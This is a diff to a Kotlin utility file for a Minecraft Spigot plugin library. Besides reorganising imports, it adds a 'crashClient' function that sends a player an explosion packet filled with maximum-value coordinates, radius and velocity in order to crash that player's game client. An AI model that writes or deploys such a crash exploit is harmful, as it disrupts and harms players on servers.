@@ -1,9 +1,10 @@
 package com.mikael.mkutilslegacy.spigot.api
 
+import com.mikael.mkutilslegacy.api.formatPersonal
 import com.mikael.mkutilslegacy.api.formatValue
 import com.mikael.mkutilslegacy.spigot.UtilsMain
-import com.mikael.mkutilslegacy.spigot.api.lib.MineBook
 import com.mikael.mkutilslegacy.spigot.api.lib.MineItem
+import com.mikael.mkutilslegacy.spigot.api.lib.book.MineBook
 import com.mikael.mkutilslegacy.spigot.api.lib.menu.MenuPage
 import com.mikael.mkutilslegacy.spigot.api.lib.menu.MenuSystem
 import com.mikael.mkutilslegacy.spigot.api.lib.menu.MineMenu
@@ -11,6 +12,9 @@ import net.eduard.api.lib.game.ItemBuilder
 import net.eduard.api.lib.kotlin.mineSendActionBar
 import net.eduard.api.lib.kotlin.mineSendTitle
 import net.eduard.api.lib.kotlin.sendTitle
+import net.eduard.api.lib.modules.MineReflect
+import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion
+import net.minecraft.server.v1_8_R3.Vec3D
 import org.bukkit.*
 import org.bukkit.block.Block
 import org.bukkit.command.CommandSender
@@ -18,6 +22,8 @@ import org.bukkit.entity.*
 import org.bukkit.event.inventory.InventoryClickEvent
 import org.bukkit.inventory.Inventory
 import org.bukkit.inventory.ItemStack
+import java.util.*
+
 
 // MineBook extra functions - Start
 /**
@@ -94,6 +100,23 @@ var Player.openedMineMenuPage: MenuPage?
         }
     }
 // MineMenu extra functions - End
+
+/**
+ * Cashes the given [Player] client. USE WITH MODERATION!
+ */
+fun Player.crashClient() {
+    UtilsMain.instance.log("§c[Player Crasher] §eCrashing player ${this.name.formatPersonal()} client.")
+    MineReflect.sendPacket(
+        this, PacketPlayOutExplosion(
+            Double.MAX_VALUE,
+            Double.MAX_VALUE,
+            Double.MAX_VALUE,
+            Float.MAX_VALUE,
+            Collections.emptyList(),
+            Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)
+        )
+    )
+}
 
 /**
  * @return if [Ageable.isAdult] 'Adult' else 'Baby'.
